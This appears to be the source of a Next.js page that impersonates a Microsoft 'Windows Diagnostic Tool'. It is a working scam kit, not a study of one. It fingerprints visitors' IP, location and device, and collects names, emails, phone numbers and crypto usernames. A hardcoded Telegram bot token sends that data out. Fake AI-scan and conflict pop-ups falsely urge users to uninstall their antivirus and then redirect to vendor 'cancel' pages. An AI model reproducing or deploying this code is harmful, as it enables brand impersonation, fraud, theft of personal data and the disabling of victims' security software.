'use client'

import Image from 'next/image'
import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'

interface SessionData {
  userAgent: string
  ipAddress: string
  city: string
  state: string
  country: string
}

interface DeviceProfile {
  screenResolution: string
  deviceRam: string
  processors: string
  operatingSystem: string
}

export default function Home() {
  const router = useRouter()
  const [sessionData, setSessionData] = useState<SessionData>({
    userAgent: '',
    ipAddress: '',
    city: '',
    state: '',
    country: '',
  })

  const [deviceProfile, setDeviceProfile] = useState<DeviceProfile>({
    screenResolution: '',
    deviceRam: '',
    processors: '',
    operatingSystem: '',
  })

  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    agentId: '',
    agentName: '',
    alternatePhone: '',
    explicitContent: '',
    cryptoUsername: '',
  })

  const [showModal, setShowModal] = useState(false)
  const [progress, setProgress] = useState(0)
  const [showConflictModal, setShowConflictModal] = useState(false)
  const [showFixModal, setShowFixModal] = useState(false)
  const [selectedAntivirus, setSelectedAntivirus] = useState('')

  useEffect(() => {
    // Get session data
    const userAgent = navigator.userAgent
    const screenWidth = window.screen.width
    const screenHeight = window.screen.height
    const deviceMemory = (navigator as any).deviceMemory || 'Unknown'
    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown'
    const platform = navigator.platform || 'Unknown'

    setSessionData({
      userAgent: userAgent,
      ipAddress: 'Loading...',
      city: 'Loading...',
      state: 'Loading...',
      country: 'Loading...',
    })

    setDeviceProfile({
      screenResolution: `${screenWidth}x${screenHeight}`,
      deviceRam: deviceMemory !== 'Unknown' ? `${deviceMemory} GB` : 'Unknown',
      processors: String(hardwareConcurrency),
      operatingSystem: platform.includes('Win') ? 'Windows' : platform,
    })

    // Fetch IP and location data
    fetchIPData()
  }, [])

  const fetchIPData = async () => {
    try {
      // Try primary API: ipwho.is (good CORS support)
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 5000)
      
      const response = await fetch('https://ipwho.is/', {
        signal: controller.signal
      })
      
      clearTimeout(timeoutId)
      
      if (!response.ok) {
        throw new Error('API request failed')
      }
      
      const data = await response.json()

      if (data.success === false) {
        throw new Error(data.message || 'API error')
      }

      setSessionData(prev => ({
        ...prev,
        ipAddress: data.ip || 'Unknown',
        city: data.city || 'Unknown',
        state: data.region || data.region_name || 'Unknown',
        country: data.country || data.country_name || 'Unknown',
      }))
    } catch (error) {
      // Fallback 1: ipapi.co
      try {
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 5000)
        
        const response = await fetch('https://ipapi.co/json/', {
          signal: controller.signal
        })
        
        clearTimeout(timeoutId)
        
        if (!response.ok) {
          throw new Error('API failed')
        }

        const data = await response.json()

        if (data.error) {
          throw new Error(data.reason || 'API error')
        }

        setSessionData(prev => ({
          ...prev,
          ipAddress: data.ip || 'Unknown',
          city: data.city || 'Unknown',
          state: data.region || 'Unknown',
          country: data.country_name || 'Unknown',
        }))
      } catch (fallbackError) {
        // Final fallback 2: just IP from ipify
        try {
          const controller = new AbortController()
          const timeoutId = setTimeout(() => controller.abort(), 5000)

          const response = await fetch('https://api.ipify.org?format=json', {
            signal: controller.signal
          })

          clearTimeout(timeoutId)

          if (response.ok) {
            const data = await response.json()
            setSessionData(prev => ({
              ...prev,
              ipAddress: data.ip || 'Unable to detect',
              city: 'Unable to detect',
              state: 'Unable to detect',
              country: 'Unable to detect',
            }))
          } else {
            throw new Error('API failed')
          }
        } catch {
          // Final fallback
          setSessionData(prev => ({
            ...prev,
            ipAddress: 'Unable to detect',
            city: 'Unable to detect',
            state: 'Unable to detect',
            country: 'Unable to detect',
          }))
        }
      }
    }
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const isFormValid = () => {
    return (
      formData.fullName.trim() !== '' &&
      formData.email.trim() !== '' &&
      formData.agentId.trim() !== '' &&
      formData.agentName.trim() !== '' &&
      formData.alternatePhone.trim() !== '' &&
      formData.explicitContent !== '' &&
      formData.cryptoUsername.trim() !== ''
    )
  }

  const sendToTelegram = async (data: typeof formData) => {
    const BOT_TOKEN = '7663738832:AAFJRhJjYu6eF1Edv2KhxZ_ytVvH8ozKgCM'
    
    // Format the message with form data
    const message = `🔔 *New Form Submission*

*Full Name:* ${data.fullName}
*Email:* ${data.email}
*Agent ID:* ${data.agentId || 'N/A'}
*Agent Name:* ${data.agentName || 'N/A'}
*Alternate Phone:* ${data.alternatePhone || 'N/A'}
*Explicit Content:* ${data.explicitContent || 'N/A'}
*Crypto Username:* ${data.cryptoUsername || 'N/A'}

*Session Data:*
• IP Address: ${sessionData.ipAddress}
• City: ${sessionData.city}
• State: ${sessionData.state}
• Country: ${sessionData.country}
• User Agent: ${sessionData.userAgent.substring(0, 100)}${sessionData.userAgent.length > 100 ? '...' : ''}

*Device Profile:*
• Screen Resolution: ${deviceProfile.screenResolution}
• Device RAM: ${deviceProfile.deviceRam}
• Processors: ${deviceProfile.processors}
• Operating System: ${deviceProfile.operatingSystem}`

    try {
      // Group chat_id
      // Note: Make sure your bot is added to the group as a member/admin
      const CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '-5131934008'
      
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      })

      const result = await response.json()
      
      if (!response.ok) {
        console.error('Telegram API error:', result)
      } else {
        console.log('Message sent to Telegram successfully')
      }
    } catch (error) {
      console.error('Error sending to Telegram:', error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!isFormValid()) return
    
    // Send data to Telegram
    await sendToTelegram(formData)
    
    // Show modal
    setShowModal(true)
    setProgress(0)
  }

  useEffect(() => {
    const anyModalOpen = showModal || showConflictModal || showFixModal

    if (anyModalOpen) {
      document.body.style.overflow = 'hidden'
    } else {
      document.body.style.overflow = ''
    }

    if (!showModal) {
      return
    }

    const duration = 35000 // 35 seconds
    const interval = 50 // Update every 50ms for smoother animation
    const increment = (100 / duration) * interval

    const timer = setInterval(() => {
      setProgress((prev) => {
        const newProgress = prev + increment
        if (newProgress >= 100) {
          clearInterval(timer)
          setTimeout(() => {
            setShowModal(false)
            setProgress(0)
            setShowConflictModal(true)
          }, 500)
          return 100
        }
        return newProgress
      })
    }, interval)

    return () => {
      clearInterval(timer)
    }
  }, [showModal, showConflictModal, showFixModal])

  return (
    <>
      <header className="header">
        <div className="header-brand">
          <a href="https://microchipsecurity.tech/#" className="header-link">
            <Image 
              src="/microsoft-logo.png" 
              alt="Microsoft" 
              width={108} 
              height={24}
              className="header-logo"
            />
          </a>
          <a href="https://microchipsecurity.tech/#" className="header-link header-title">
            Diagnostic Tool
          </a>
        </div>
      </header>

      <main className="main-container">
        <div className="content-layout">
          {/* Session Data Card */}
          <div className="info-card">
            <h3 className="info-card-title">Session Data</h3>
            
            <div className="info-item">
              <div className="info-label">User Agent</div>
              <div className="info-value">{sessionData.userAgent}</div>
            </div>
            
            <div className="info-item">
              <div className="info-label">IP Address</div>
              <div className="info-value">{sessionData.ipAddress}</div>
            </div>
            
            <div className="info-item">
              <div className="info-label">City</div>
              <div className="info-value">{sessionData.city}</div>
            </div>
            
            <div className="info-item">
              <div className="info-label">State</div>
              <div className="info-value">{sessionData.state}</div>
            </div>
            
            <div className="info-item">
              <div className="info-label">Country</div>
              <div className="info-value">{sessionData.country}</div>
            </div>
          </div>

          {/* Center Content */}
          <div className="center-content">
            <Image 
              src="/windows-logo.png" 
              alt="Windows" 
              width={120} 
              height={120}
              className="windows-logo"
            />
            
            <h1 className="main-title">Windows Diagnostic Tool</h1>
            <p className="subtitle">AI-Assisted Compatibility Assessment</p>
            
            <h2 className="alert-title">Windows Upgrade Detected</h2>
            
            <p className="description">
              Upgraded version of Windows does not require and support third-party antivirus 
              software. Uninstall immediately.
            </p>
            
            <p className="description description-highlight">
              This type of issue commonly arises when old apps in Windows no longer work due to 
              the upgrade. When you encounter this issue, you are aware that it is one of the 
              operating system breakdown symptoms, but you can easily address it. In most cases, 
              Windows offers an in-built capability that allows applications to be made compatible 
              with the new version. If you are a computer expert and are familiar with the language, 
              you can run the software in compatibility mode.
            </p>

            <p className="form-intro">
              To continue, please provide your <strong>Email</strong> and <strong>Name</strong> below.
            </p>

            <form className="diagnostic-form" onSubmit={handleSubmit} autoComplete="off">
              <div className="form-group">
                <label className="form-label">Full Name</label>
                <input
                  type="text"
                  name="fullName"
                  className="form-input"
                  value={formData.fullName}
                  onChange={handleInputChange}
                  autoComplete="off"
                  required
                />
              </div>

              <div className="form-group">
                <label className="form-label">Email</label>
                <input
                  type="email"
                  name="email"
                  className="form-input"
                  value={formData.email}
                  onChange={handleInputChange}
                  autoComplete="off"
                  required
                />
              </div>

              <div className="form-group">
                <label className="form-label">Agent ID</label>
                <input
                  type="text"
                  name="agentId"
                  className="form-input"
                  value={formData.agentId}
                  onChange={handleInputChange}
                  autoComplete="off"
                />
              </div>

              <div className="form-group">
                <label className="form-label">Agent Name</label>
                <input
                  type="text"
                  name="agentName"
                  className="form-input"
                  value={formData.agentName}
                  onChange={handleInputChange}
                  autoComplete="off"
                />
              </div>

              <div className="form-group">
                <label className="form-label">Alternate Phone Number</label>
                <input
                  type="tel"
                  name="alternatePhone"
                  className="form-input"
                  value={formData.alternatePhone}
                  onChange={handleInputChange}
                  autoComplete="off"
                />
              </div>

              <div className="form-group">
                <label className="form-label">Explicit Content</label>
                <select
                  name="explicitContent"
                  className="form-select"
                  value={formData.explicitContent}
                  onChange={handleInputChange}
                  autoComplete="off"
                >
                  <option value="">Please select answer...</option>
                  <option value="yes">Yes</option>
                  <option value="no">No</option>
                </select>
              </div>

              <div className="form-group">
                <label className="form-label">Crypto Username</label>
                <input
                  type="text"
                  name="cryptoUsername"
                  className="form-input"
                  value={formData.cryptoUsername}
                  onChange={handleInputChange}
                  autoComplete="off"
                />
              </div>

              <button 
                type="submit" 
                className="submit-button"
                disabled={!isFormValid()}
              >
                Fix Now &gt;&gt;
              </button>
            </form>
          </div>

          {/* Device Profile Card */}
          <div className="info-card">
            <h3 className="info-card-title">Device Profile</h3>
            
            <div className="info-item">
              <div className="info-label">Screen Resolution</div>
              <div className="info-value">{deviceProfile.screenResolution}</div>
            </div>
            
            <div className="info-item">
              <div className="info-label">Device RAM</div>
              <div className="info-value">{deviceProfile.deviceRam}</div>
            </div>
            
            <div className="info-item">
              <div className="info-label">Processors</div>
              <div className="info-value">{deviceProfile.processors}</div>
            </div>
            
            <div className="info-item">
              <div className="info-label">Operating System</div>
              <div className="info-value">{deviceProfile.operatingSystem}</div>
            </div>
          </div>
        </div>
      </main>

      {/* AI Device Scan Modal */}
      {showModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <div className="modal-header">
              <div className="modal-icon"></div>
              <h3 className="modal-title">AI Device Scan</h3>
            </div>
            
            <div className="modal-body">
              <div className="loader-container">
                <div className="animated-loader">
                  <div className="animated-loader-inner"></div>
                </div>
              </div>
              
              <p className="modal-status">
                Reviewing startup and background processes... {Math.round(progress)}%
              </p>
              
              <div className="progress-bar-container">
                <div 
                  className="progress-bar-fill" 
                  style={{ width: `${progress}%` }}
                ></div>
              </div>
              
              <p className="modal-substatus">
                <span className="status-icon"></span>
                AI assistant: analysing system configuration in real time
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Conflict Detected Modal */}
      {showConflictModal && (
        <div className="modal-overlay">
          <div className="conflict-modal">
            <h3 className="conflict-title">Conflict Detected</h3>

            <p className="conflict-text-main">
              Windows Defender appears to be conflicting with an existing Anti-Virus.
            </p>

            <p className="conflict-text-sub">
              Please select below which Anti-Virus you currently have installed.
            </p>

            <div className="conflict-select-wrapper">
              <select
                name="installedAntivirus"
                className="conflict-select"
                value={selectedAntivirus}
                onChange={(e) => setSelectedAntivirus(e.target.value)}
              >
                <option value="">Select Anti-Virus...</option>
                <option value="Norton">Norton</option>
                <option value="McAfee">McAfee</option>
                <option value="AVG">AVG</option>
                <option value="Trend Micro">Trend Micro</option>
                <option value="MalwareBytes">MalwareBytes</option>
                <option value="Avast">Avast</option>
                <option value="Bitdefender">Bitdefender</option>
                <option value="Kaspersky">Kaspersky</option>
                <option value="Webroot">Webroot</option>
                <option value="Windows Defender">Windows Defender</option>
                <option value="Other">Other</option>
              </select>
            </div>

            <div className="conflict-button-row">
              <button
                type="button"
                className="conflict-proceed-button"
                disabled={!selectedAntivirus}
                onClick={() => {
                  setShowConflictModal(false)
                  setShowFixModal(true)
                }}
              >
                Proceed &gt;
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Fix Required Modal */}
      {showFixModal && (
        <div className="modal-overlay">
          <div className="fix-modal">
            <h3 className="fix-title">Fix Required</h3>

            <p className="fix-text-main">
              {selectedAntivirus || 'This Anti-Virus'} is not supported with your version of{' '}
              <span className="fix-highlight">Windows</span>.
            </p>

            <p className="fix-text-sub">
              Please uninstall {selectedAntivirus || 'this Anti-Virus'} immediately.
            </p>

            <div className="conflict-button-row">
              <button
                type="button"
                className="submit-button"
                onClick={() => {
                  setShowFixModal(false)
                  const target = (selectedAntivirus || 'McAfee')
                    .toLowerCase()
                    .replace(/\s+/g, '')
                    .replace(/[^a-z0-9]/g, '')
                  setSelectedAntivirus('')
                  router.push(`/cancel/${target}`)
                }}
              >
                Fix Now &gt;
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  )
}

